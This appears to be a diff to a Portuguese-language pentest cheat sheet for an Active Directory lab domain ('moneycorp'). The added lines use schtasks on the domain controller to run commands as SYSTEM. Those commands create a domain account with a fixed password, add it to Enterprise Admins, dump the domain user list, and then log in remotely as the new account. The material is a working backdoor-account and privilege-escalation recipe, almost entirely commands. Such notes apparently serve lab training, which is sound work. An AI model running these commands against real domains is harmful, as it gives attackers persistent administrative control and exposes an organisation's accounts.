@@ -2981,7 +2981,7 @@ Enter-PSSession $appsrv1
 cd C:\Users\appadmin\
 ls
 ```
-##### POWERSHELL - TAREFAS AGENDADAS REMOTAMENTE
+##### CMD - TAREFAS AGENDADAS REMOTAMENTE
 CRIAR UMA TAREFA PARA PING (TESTE DE CONECTIVIDADE)
 ```
 schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "PING" /TR "cmd /c ping 172.16.99.209"
@@ -2993,9 +2993,22 @@ schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM
 schtasks /RUN /S mcorp-dc.moneycorp.local /TN "AVSTATUS"
 type \\mcorp-dc.moneycorp.local\c$\avstatus.txt | findstr /I realtime
 ```
-
-
-
+CRIAR UMA TAREFA PARA CRIAR USUARIO E ADICIONAR EM GRUPO NO DOMINIO
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "PENTESTER1" /TR "net user /add pentester 123qwe.. /domain"
+schtasks /RUN /S mcorp-dc.moneycorp.local /TN "PENTESTER1"
+```
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "PENTESTER2" /TR "net group 'Enterprise Admins' pentester /add /domain"
+schtasks /RUN /S mcorp-dc.moneycorp.local /TN "PENTESTER2"
+```
+```
+schtasks /create /S mcorp-dc.moneycorp.local /SC WEEKLY /RU "NT Authority\SYSTEM" /TN "NETUSERS" /TR "cmd /c net users /domain > c:\users.txt"
+schtasks /RUN /S mcorp-dc.moneycorp.local /TN "NETUSERS"
+```
+```
+enter-pssession -computername mcorp-dc.moneycorp.local -credential  pentester@moneycorp.local
+```
 
 
 
